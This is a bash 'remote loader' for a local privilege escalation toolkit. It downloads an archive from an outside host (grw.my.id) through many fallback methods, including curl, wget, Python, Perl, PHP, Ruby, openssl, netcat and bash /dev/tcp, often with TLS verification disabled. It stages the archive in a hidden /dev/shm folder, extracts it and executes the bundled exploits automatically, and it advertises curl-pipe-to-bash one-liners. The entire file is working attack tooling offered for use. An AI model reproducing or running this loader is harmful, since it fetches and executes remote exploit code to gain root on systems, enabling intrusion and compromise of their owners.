#!/bin/bash
# ==============================================================================
#  AUTO LPE REMOTE LOADER — Download + Execute COPYRIGHT Toolkit
#  Fetches COPYRIGHT.zip from https://grw.my.id/COPYRIGHT.zip via all available
#  methods, extracts, and runs run.sh in auto mode.
#
#  One-liner usage:
#    bash <(curl -fsSL https://grw.my.id/get || wget -qO- https://grw.my.id/get)
#
#  Direct usage:
#    chmod +x get_lpe.sh && ./get_lpe.sh
#
#  All download methods tried (in order):
#    curl, wget, python3, python2, python, perl, busybox, bash /dev/tcp,
#    openssl s_client, netcat/nc
# ==============================================================================

set -o pipefail

# --- Globals ---
REMOTE_URL="https://grw.my.id/COPYRIGHT.zip"
WORKDIR="/dev/shm/.lpe_$$"
ZIPFILE="${WORKDIR}/COPYRIGHT.zip"
EXTRACT_DIR="${WORKDIR}/COPYRIGHT"

# --- Colors ---
if [[ -t 1 ]]; then
    RED='\033[0;31m'; GRN='\033[0;32m'; YLW='\033[1;33m'
    BLU='\033[0;34m'; CYN='\033[0;36m'; NC='\033[0m'; BLD='\033[1m'
else
    RED=''; GRN=''; YLW=''; BLU=''; CYN=''; NC=''; BLD=''
fi

# --- Cleanup ---
cleanup() {
    echo -e "${BLU}[*]${NC} Cleaning up temp files..."
    rm -rf "$WORKDIR" 2>/dev/null
}
trap cleanup EXIT

# --- Logging ---
log_info()  { echo -e "${BLU}[*]${NC} $*"; }
log_ok()    { echo -e "${GRN}[+]${NC} $*"; }
log_warn()  { echo -e "${YLW}[!]${NC} $*"; }
log_err()   { echo -e "${RED}[-]${NC} $*"; }
log_title() { echo -e "\n${BLD}${CYN}═════ $* ═════${NC}"; }

# --- Banner ---
banner() {
    echo -e "${CYN}${BLD}"
    echo "   ╔══════════════════════════════════════════════╗"
    echo "   ║  AUTO LPE — REMOTE LOADER                   ║"
    echo "   ║  Source: ${REMOTE_URL}  ║"
    echo "   ╚══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# ============================================================================
# DOWNLOAD METHODS — tries every possible way to fetch the file
# ============================================================================

METHOD_USED=""

try_curl() {
    log_info "Trying: curl..."
    if command -v curl >/dev/null 2>&1; then
        curl -fsSL --connect-timeout 10 --max-time 120 \
            -o "$ZIPFILE" "$REMOTE_URL" 2>/dev/null
        if [ -f "$ZIPFILE" ] && [ "$(stat -c%s "$ZIPFILE" 2>/dev/null || echo 0)" -gt 10000 ]; then
            METHOD_USED="curl"
            return 0
        fi
    fi
    return 1
}

try_wget() {
    log_info "Trying: wget..."
    if command -v wget >/dev/null 2>&1; then
        wget -q --timeout=10 --tries=3 \
            -O "$ZIPFILE" "$REMOTE_URL" 2>/dev/null
        if [ -f "$ZIPFILE" ] && [ "$(stat -c%s "$ZIPFILE" 2>/dev/null || echo 0)" -gt 10000 ]; then
            METHOD_USED="wget"
            return 0
        fi
    fi
    return 1
}

try_python3() {
    log_info "Trying: python3..."
    if command -v python3 >/dev/null 2>&1; then
        python3 -c "
import urllib.request, sys
try:
    req = urllib.request.Request('${REMOTE_URL}', headers={'User-Agent': 'Mozilla/5.0'})
    resp = urllib.request.urlopen(req, timeout=30)
    with open('${ZIPFILE}', 'wb') as f:
        f.write(resp.read())
    sys.exit(0)
except Exception as e:
    print(e, file=sys.stderr)
    sys.exit(1)
" 2>/dev/null
        if [ -f "$ZIPFILE" ] && [ "$(stat -c%s "$ZIPFILE" 2>/dev/null || echo 0)" -gt 10000 ]; then
            METHOD_USED="python3"
            return 0
        fi
    fi
    return 1
}

try_python2() {
    log_info "Trying: python2..."
    if command -v python2 >/dev/null 2>&1; then
        python2 -c "
import urllib2, sys
try:
    req = urllib2.Request('${REMOTE_URL}', headers={'User-Agent': 'Mozilla/5.0'})
    resp = urllib2.urlopen(req, timeout=30)
    with open('${ZIPFILE}', 'wb') as f:
        f.write(resp.read())
    sys.exit(0)
except Exception as e:
    print(e)
    sys.exit(1)
" 2>/dev/null
        if [ -f "$ZIPFILE" ] && [ "$(stat -c%s "$ZIPFILE" 2>/dev/null || echo 0)" -gt 10000 ]; then
            METHOD_USED="python2"
            return 0
        fi
    fi
    return 1
}

try_python() {
    log_info "Trying: python..."
    if command -v python >/dev/null 2>&1; then
        python -c "
import urllib2, sys
try:
    req = urllib2.Request('${REMOTE_URL}', headers={'User-Agent': 'Mozilla/5.0'})
    resp = urllib2.urlopen(req, timeout=30)
    with open('${ZIPFILE}', 'wb') as f:
        f.write(resp.read())
    sys.exit(0)
except:
    try:
        import urllib.request
        req = urllib.request.Request('${REMOTE_URL}', headers={'User-Agent': 'Mozilla/5.0'})
        resp = urllib.request.urlopen(req, timeout=30)
        with open('${ZIPFILE}', 'wb') as f:
            f.write(resp.read())
        sys.exit(0)
    except Exception as e:
        print(e)
        sys.exit(1)
" 2>/dev/null
        if [ -f "$ZIPFILE" ] && [ "$(stat -c%s "$ZIPFILE" 2>/dev/null || echo 0)" -gt 10000 ]; then
            METHOD_USED="python"
            return 0
        fi
    fi
    return 1
}

try_perl() {
    log_info "Trying: perl..."
    if command -v perl >/dev/null 2>&1; then
        perl -MLWP::Simple -e "
eval {
    my \$content = getstore('${REMOTE_URL}', '${ZIPFILE}');
    exit(0);
};
exit(1) if \$@;
" 2>/dev/null
        if [ -f "$ZIPFILE" ] && [ "$(stat -c%s "$ZIPFILE" 2>/dev/null || echo 0)" -gt 10000 ]; then
            METHOD_USED="perl (LWP::Simple)"
            return 0
        fi

        # Fallback: perl with IO::Socket::SSL
        log_info "Trying: perl + IO::Socket::SSL..."
        perl -e '
use strict;
use warnings;
use IO::Socket::SSL;
my $host = "grw.my.id";
my $sock = IO::Socket::SSL->new(
    PeerHost => $host,
    PeerPort => 443,
    SSL_verify_mode => 0,
    Timeout => 10
) or exit 1;
print $sock "GET /COPYRIGHT.zip HTTP/1.1\r\n";
print $sock "Host: $host\r\n";
print $sock "User-Agent: Mozilla/5.0\r\n";
print $sock "Connection: close\r\n";
print $sock "\r\n";
my $body = "";
my $in_body = 0;
while (my $line = <$sock>) {
    if ($in_body) { $body .= $line; }
    elsif ($line =~ /^\r?\n$/) { $in_body = 1; }
}
close $sock;
open my $fh, ">", "'"$ZIPFILE"'" or exit 1;
binmode $fh;
print $fh $body;
close $fh;
exit 0;
' 2>/dev/null
        if [ -f "$ZIPFILE" ] && [ "$(stat -c%s "$ZIPFILE" 2>/dev/null || echo 0)" -gt 10000 ]; then
            METHOD_USED="perl (IO::Socket::SSL)"
            return 0
        fi
    fi
    return 1
}

try_busybox() {
    log_info "Trying: busybox wget..."
    if command -v busybox >/dev/null 2>&1; then
        busybox wget -q -O "$ZIPFILE" "$REMOTE_URL" 2>/dev/null
        if [ -f "$ZIPFILE" ] && [ "$(stat -c%s "$ZIPFILE" 2>/dev/null || echo 0)" -gt 10000 ]; then
            METHOD_USED="busybox wget"
            return 0
        fi
    fi
    return 1
}

try_bash_tcp() {
    log_info "Trying: bash /dev/tcp..."
    # This only works in interactive bash, not sh, and requires /dev/tcp compiled in
    if [ -n "$BASH_VERSION" ] && [ -r /dev/tcp ]; then
        (
            exec 3<>/dev/tcp/grw.my.id/443 2>/dev/null || exit 1
            cat <<-EOF >&3
GET /COPYRIGHT.zip HTTP/1.1
Host: grw.my.id
User-Agent: Mozilla/5.0
Connection: close

EOF
            # Read past headers
            local in_body=0
            while IFS= read -r -t 5 -u 3 line 2>/dev/null; do
                if [ $in_body -eq 1 ]; then
                    printf '%s\n' "$line"
                elif [ -z "$line" ]; then
                    in_body=1
                fi
            done > "$ZIPFILE"
            exec 3>&-
        ) 2>/dev/null
        if [ -f "$ZIPFILE" ] && [ "$(stat -c%s "$ZIPFILE" 2>/dev/null || echo 0)" -gt 10000 ]; then
            METHOD_USED="bash /dev/tcp"
            return 0
        fi
    fi
    return 1
}

try_openssl() {
    log_info "Trying: openssl s_client..."
    if command -v openssl >/dev/null 2>&1; then
        (
            echo "GET /COPYRIGHT.zip HTTP/1.1"
            echo "Host: grw.my.id"
            echo "User-Agent: Mozilla/5.0"
            echo "Connection: close"
            echo ""
            sleep 2
        ) | openssl s_client -quiet -connect grw.my.id:443 2>/dev/null | \
            sed -n '/^\r$/,//p' | tail -n +2 > "$ZIPFILE" 2>/dev/null

        if [ -f "$ZIPFILE" ] && [ "$(stat -c%s "$ZIPFILE" 2>/dev/null || echo 0)" -gt 10000 ]; then
            METHOD_USED="openssl s_client"
            return 0
        fi
    fi
    return 1
}

try_nc() {
    log_info "Trying: nc (netcat)..."
    if command -v nc >/dev/null 2>&1; then
        (
            printf "GET /COPYRIGHT.zip HTTP/1.1\r\nHost: grw.my.id\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
            sleep 3
        ) | nc -w 10 grw.my.id 443 2>/dev/null | \
            sed -n '/^\r$/,//p' | tail -n +2 > "$ZIPFILE" 2>/dev/null

        if [ -f "$ZIPFILE" ] && [ "$(stat -c%s "$ZIPFILE" 2>/dev/null || echo 0)" -gt 10000 ]; then
            METHOD_USED="nc"
            return 0
        fi
    fi

    # Try ncat
    log_info "Trying: ncat..."
    if command -v ncat >/dev/null 2>&1; then
        (
            printf "GET /COPYRIGHT.zip HTTP/1.1\r\nHost: grw.my.id\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
            sleep 3
        ) | ncat --ssl -w 10 grw.my.id 443 2>/dev/null | \
            sed -n '/^\r$/,//p' | tail -n +2 > "$ZIPFILE" 2>/dev/null

        if [ -f "$ZIPFILE" ] && [ "$(stat -c%s "$ZIPFILE" 2>/dev/null || echo 0)" -gt 10000 ]; then
            METHOD_USED="ncat --ssl"
            return 0
        fi
    fi
    return 1
}

try_php() {
    log_info "Trying: php..."
    if command -v php >/dev/null 2>&1; then
        php -r "
\$ctx = stream_context_create(['ssl' => ['verify_peer' => false, 'verify_peer_name' => false]]);
\$data = file_get_contents('${REMOTE_URL}', false, \$ctx);
if (\$data !== false && strlen(\$data) > 10000) {
    file_put_contents('${ZIPFILE}', \$data);
    exit(0);
}
exit(1);
" 2>/dev/null
        if [ -f "$ZIPFILE" ] && [ "$(stat -c%s "$ZIPFILE" 2>/dev/null || echo 0)" -gt 10000 ]; then
            METHOD_USED="php"
            return 0
        fi
    fi
    return 1
}

try_ruby() {
    log_info "Trying: ruby..."
    if command -v ruby >/dev/null 2>&1; then
        ruby -e "
require 'net/https'
require 'uri'
uri = URI.parse('${REMOTE_URL}')
http = Net::HTTP.new(uri.host, uri.port)
http.use_ssl = true
http.verify_mode = OpenSSL::SSL::VERIFY_NONE
http.open_timeout = 10
http.read_timeout = 30
req = Net::HTTP::Get.new(uri.request_uri)
req['User-Agent'] = 'Mozilla/5.0'
resp = http.request(req)
File.open('${ZIPFILE}', 'wb') { |f| f.write(resp.body) }
" 2>/dev/null
        if [ -f "$ZIPFILE" ] && [ "$(stat -c%s "$ZIPFILE" 2>/dev/null || echo 0)" -gt 10000 ]; then
            METHOD_USED="ruby"
            return 0
        fi
    fi
    return 1
}

# ============================================================================
# DOWNLOAD ORCHESTRATOR
# ============================================================================
do_download() {
    log_title "DOWNLOADING COPYRIGHT.zip"
    echo ""

    mkdir -p "$WORKDIR"

    # Try all methods in order
    try_curl       && return 0
    try_wget       && return 0
    try_python3    && return 0
    try_python2    && return 0
    try_python     && return 0
    try_perl       && return 0
    try_php        && return 0
    try_ruby       && return 0
    try_busybox    && return 0
    try_openssl    && return 0
    try_nc         && return 0
    try_bash_tcp   && return 0

    # If we get here, everything failed
    log_err "ALL DOWNLOAD METHODS FAILED"
    log_err "Could not download ${REMOTE_URL}"
    log_err ""
    log_err "Manual download options:"
    log_err "  1. Upload COPYRIGHT.zip manually to ${WORKDIR}/"
    log_err "  2. Check if the URL is accessible from this host"
    log_err "  3. Check firewall/proxy settings"
    return 1
}

# ============================================================================
# EXTRACTION
# ============================================================================
do_extract() {
    log_title "EXTRACTING ARCHIVE"

    local fsize=$(stat -c%s "$ZIPFILE" 2>/dev/null || echo 0)
    log_info "File size: ${fsize} bytes"

    # Verify it's a valid ZIP
    if ! head -c4 "$ZIPFILE" | grep -q 'PK'; then
        log_err "File is not a valid ZIP archive (bad magic bytes)"
        log_err "First 4 bytes: $(head -c4 "$ZIPFILE" | xxd -p 2>/dev/null || head -c4 "$ZIPFILE" | od -A n -t x1 | tr -d ' \n')"
        return 1
    fi

    # Try unzip first
    if command -v unzip >/dev/null 2>&1; then
        log_info "Using: unzip"
        unzip -o "$ZIPFILE" -d "$WORKDIR" >/dev/null 2>&1 && return 0
    fi

    # Try python3 zipfile
    if command -v python3 >/dev/null 2>&1; then
        log_info "Using: python3 zipfile"
        python3 -c "
import zipfile, sys
try:
    with zipfile.ZipFile('${ZIPFILE}', 'r') as z:
        z.extractall('${WORKDIR}')
    sys.exit(0)
except Exception as e:
    print(e, file=sys.stderr)
    sys.exit(1)
" 2>/dev/null && return 0
    fi

    # Try python2
    if command -v python2 >/dev/null 2>&1; then
        log_info "Using: python2 zipfile"
        python2 -c "
import zipfile, sys
try:
    with zipfile.ZipFile('${ZIPFILE}', 'r') as z:
        z.extractall('${WORKDIR}')
    sys.exit(0)
except Exception as e:
    print e
    sys.exit(1)
" 2>/dev/null && return 0
    fi

    # Try perl
    if command -v perl >/dev/null 2>&1; then
        log_info "Using: perl Archive::Zip"
        perl -MArchive::Zip -e "
my \$zip = Archive::Zip->new('${ZIPFILE}');
\$zip->extractTree('', '${WORKDIR}/');
exit(0);
" 2>/dev/null && return 0
    fi

    # Try busybox
    if command -v busybox >/dev/null 2>&1; then
        log_info "Using: busybox unzip"
        busybox unzip -o "$ZIPFILE" -d "$WORKDIR" >/dev/null 2>&1 && return 0
    fi

    # Try 7z
    if command -v 7z >/dev/null 2>&1; then
        log_info "Using: 7z"
        7z x "$ZIPFILE" -o"$WORKDIR" -y >/dev/null 2>&1 && return 0
    fi

    log_err "Cannot extract ZIP — no suitable tool found"
    return 1
}

# ============================================================================
# EXECUTE
# ============================================================================
do_execute() {
    log_title "RUNNING EXPLOITS"
    echo ""

    # Find run.sh
    local RUNSH=""
    if [ -f "${EXTRACT_DIR}/run.sh" ]; then
        RUNSH="${EXTRACT_DIR}/run.sh"
    elif [ -f "$(find "$WORKDIR" -name run.sh -type f 2>/dev/null | head -1)" ]; then
        RUNSH="$(find "$WORKDIR" -name run.sh -type f 2>/dev/null | head -1)"
    else
        log_err "run.sh not found in extracted archive"
        log_info "Archive contents:"
        find "$WORKDIR" -type f 2>/dev/null | head -30
        return 1
    fi

    chmod +x "$RUNSH" 2>/dev/null
    cd "$(dirname "$RUNSH")" || return 1
    chmod +x ./* 2>/dev/null

    log_ok "Launching: ${RUNSH}"
    log_info "Working directory: $(pwd)"
    echo ""

    # Run with any extra args passed to this script
    if [ $# -gt 0 ]; then
        log_info "Passing args to run.sh: $*"
        exec bash "$RUNSH" "$@"
    else
        exec bash "$RUNSH"
    fi
}

# ============================================================================
# MAIN
# ============================================================================
main() {
    banner

    # Check if we should pass args through
    local passthrough=""
    if [ $# -gt 0 ]; then
        case "$1" in
            --help|-h)
                echo "USAGE:"
                echo "  ./get_lpe.sh                  Download + auto-run all exploits"
                echo "  ./get_lpe.sh --scan           Download + scan only"
                echo "  ./get_lpe.sh --list           Download + list exploits"
                echo "  ./get_lpe.sh --shell          Download + interactive picker"
                echo "  ./get_lpe.sh --dry-run        Download + dry-run"
                echo "  ./get_lpe.sh --keep-going     Download + keep going after success"
                echo "  ./get_lpe.sh --timeout 60     Download + custom timeout"
                echo "  ./get_lpe.sh --cleanup        Just cleanup temp files"
                echo "  ./get_lpe.sh --skip-download  Run existing extracted toolkit"
                echo ""
                echo "ALL DOWNLOAD METHODS (tried in order):"
                echo "  curl, wget, python3, python2, python, perl,"
                echo "  php, ruby, busybox, openssl, nc/ncat, bash /dev/tcp"
                echo ""
                echo "ONE-LINER:"
                echo "  curl -fsSL https://grw.my.id/get | bash"
                echo "  wget -qO- https://grw.my.id/get | bash"
                exit 0
                ;;
            --cleanup)
                rm -rf /dev/shm/.lpe_* 2>/dev/null
                log_ok "Cleanup completed"
                exit 0
                ;;
            --skip-download)
                log_info "Skipping download, using existing files..."
                # Try multiple locations for existing toolkit (resolve all to absolute paths)
                SCRIPT_ABS="$(cd "$(dirname "$0")" 2>/dev/null && pwd)"
                for search_dir in /dev/shm/.lpe_* "${SCRIPT_ABS}/COPYRIGHT_extracted" "${SCRIPT_ABS}/COPYRIGHT" "${SCRIPT_ABS}" "$(pwd)/COPYRIGHT_extracted" "$(pwd)/COPYRIGHT" "$(pwd)"; do
                    if [ -d "${search_dir}/COPYRIGHT" ] && [ -f "${search_dir}/COPYRIGHT/run.sh" ]; then
                        WORKDIR="${search_dir}"
                        EXTRACT_DIR="${WORKDIR}/COPYRIGHT"
                        ZIPFILE="${WORKDIR}/COPYRIGHT.zip"
                        break
                    fi
                    if [ -f "${search_dir}/run.sh" ]; then
                        EXTRACT_DIR="${search_dir}"
                        WORKDIR="${search_dir}"
                        break
                    fi
                done
                if [ ! -d "$EXTRACT_DIR" ] || [ ! -f "${EXTRACT_DIR}/run.sh" ]; then
                    log_err "No existing extracted toolkit found"
                    log_err "Searched: /dev/shm/.lpe_*/, ./COPYRIGHT_extracted/, ./COPYRIGHT/, ."
                    log_err "Run without --skip-download first"
                    exit 1
                fi
                shift
                do_execute "$@"
                exit $?
                ;;
            *)
                passthrough="$*"
                ;;
        esac
    fi

    # Download
    if ! do_download; then
        exit 1
    fi

    log_ok "Download successful — method: ${METHOD_USED}"
    log_info "Saved to: ${ZIPFILE}"
    echo ""

    # Extract
    if ! do_extract; then
        exit 1
    fi

    log_ok "Extraction successful"
    echo ""

    # Execute
    do_execute $passthrough
}

main "$@"
